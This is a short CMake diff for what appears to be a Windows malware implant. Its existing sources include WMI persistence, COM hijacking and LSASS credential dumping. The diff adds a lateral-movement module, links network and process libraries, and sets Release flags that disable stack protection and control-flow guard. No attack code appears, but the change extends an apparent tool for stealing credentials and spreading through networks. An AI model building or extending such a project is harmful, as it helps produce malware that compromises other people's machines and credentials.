@@ -70,14 +70,20 @@ add_executable(main WIN32
     src/persistence/WmiPersistence.cpp
     src/persistence/ComHijacker.cpp
     src/credential/LsassDumper.cpp
+    src/modules/Lateral.cpp
     external/sqlite3/sqlite3.c
 )
 
 target_include_directories(main PUBLIC external external/sqlite3)
 target_link_libraries(main 
     nlohmann_json::nlohmann_json
-    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi ntdll
+    bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 mscoree dbghelp wlanapi ntdll netapi32 psapi
 )
+
+# Add build optimizations for Release configuration
+if(CMAKE_BUILD_TYPE STREQUAL "Release")
+    target_compile_options(main PRIVATE "$<$<COMPILE_LANGUAGE:CXX>:/O2 /Ob2 /GL /GS- /guard:cf- /favor:ATOM /arch:AVX2>")
+endif()
 
 # Tests
 add_executable(unit_tests
